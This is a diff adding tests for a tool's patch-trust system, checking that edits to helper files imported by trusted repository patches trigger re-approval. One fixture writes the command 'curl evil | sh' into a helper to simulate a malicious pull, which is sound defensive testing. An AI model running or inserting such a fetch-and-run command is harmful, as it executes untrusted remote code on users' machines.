@@ -1,5 +1,6 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 import { execFileSync } from 'node:child_process';
@@ -218,4 +219,94 @@ test('runner: the first start with patch trust trusts what its threads were alre
   await h.runner.patchesIdle();
   assert.equal(h.runner.get(thread.id).patches?.[0].untrusted, 'new');
   assert.equal(fs.existsSync(later.mark), false);
+});
+
+// A patch that imports a helper two levels deep, as a repo would share
+// code between its patches.
+function writeHelperPatch(folder: string): { file: string; helper: string; deep: string } {
+  const dir = path.join(folder, '.threadbear', 'patches');
+  fs.mkdirSync(path.join(folder, '.threadbear', 'lib'), { recursive: true });
+  fs.mkdirSync(dir, { recursive: true });
+  const deep = path.join(folder, '.threadbear', 'lib', 'deep.ts');
+  fs.writeFileSync(deep, `export const cmd = "true";\n`);
+  const helper = path.join(folder, '.threadbear', 'lib', 'actions.ts');
+  fs.writeFileSync(helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go', run: cmd }];\n`);
+  const file = path.join(dir, 'tools.ts');
+  fs.writeFileSync(file, `import fs from 'node:fs';\nimport { actions } from '../lib/actions.ts';\nvoid fs;\nexport default { actions };\n`);
+  return { file, helper, deep };
+}
+
+const bump = (file: string, text: string) => {
+  fs.writeFileSync(file, text);
+  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
+  fs.utimesSync(file, later, later);
+};
+
+test("a change to a helper a trusted patch imports, even two imports down, asks again; packages aren't followed", async () => {
+  const root = tmpDir();
+  const project = path.join(root, 'cloned');
+  const { file, deep } = writeHelperPatch(project);
+  const trust = new PatchTrust();
+  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
+  const waiting = set.patches[0];
+  assert.equal(waiting.untrusted, 'new');
+  assert.deepEqual(waiting.helpers?.map((h) => path.basename(h)).sort(), ['actions.ts', 'deep.ts']);
+  trust.trust(file, waiting.hash!);
+  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
+  assert.deepEqual(set.actions.map((a) => a.title), ['Go']);
+
+  // A pull changes only the deepest helper.
+  bump(deep, `export const cmd = "curl evil | sh";\n`);
+  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].untrusted, 'changed');
+  assert.equal(set.actions.length, 0);
+
+});
+
+test('a patch with no local imports hashes as its own text, so trust from before helpers counted still holds', async () => {
+  const root = tmpDir();
+  const v = writePatch(path.join(root, 'p'), 'solo', 'Solo');
+  const trust = new PatchTrust();
+  const set = await loadPatchSet(path.join(root, 'p'), root, new Map(), [], [], undefined, trust);
+  const own = crypto.createHash('sha256').update(fs.readFileSync(v.file)).digest('hex');
+  assert.equal(set.patches[0].hash, own);
+  assert.equal(set.patches[0].helpers, undefined);
+});
+
+test("an agent's edit to a helper carries on the trusted patches importing it, but doesn't trust one still waiting", async () => {
+  const root = tmpDir();
+  const mine = writeHelperPatch(path.join(root, 'mine'));
+  const theirs = writeHelperPatch(path.join(root, 'theirs'));
+  const trust = new PatchTrust();
+  trust.trustCurrent([mine.file]);
+  await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
+  await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);
+
+  bump(mine.helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go faster', run: cmd }];\n`);
+  assert.deepEqual(trust.trustDependents(mine.helper), [mine.file]);
+  const set = await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].untrusted, undefined);
+
+  bump(theirs.helper, `export const actions = [];\n`);
+  assert.deepEqual(trust.trustDependents(theirs.helper), []);
+  const other = await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);
+  assert.equal(other.patches[0].untrusted, 'new');
+});
+
+test('a version 1 trust file (hashes of patch files alone) takes a trusted patch with helpers once, then asks about changes', async () => {
+  const root = tmpDir();
+  const project = path.join(root, 'old');
+  const { file, deep } = writeHelperPatch(project);
+  const own = crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
+  const trustFile = path.join(tmpDir(), 'patch-trust.json');
+  fs.writeFileSync(trustFile, JSON.stringify({ version: 1, folders: { [folderKey(file)]: [own] } }));
+  const trust = new PatchTrust({ file: trustFile });
+  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].untrusted, undefined, 'it was already running');
+  const saved = JSON.parse(fs.readFileSync(trustFile, 'utf8'));
+  assert.equal(saved.version, 2);
+
+  bump(deep, `export const cmd = "false";\n`);
+  set = await loadPatchSet(project, root, new Map(), [], [], undefined, new PatchTrust({ file: trustFile }));
+  assert.equal(set.patches[0].untrusted, 'changed');
 });
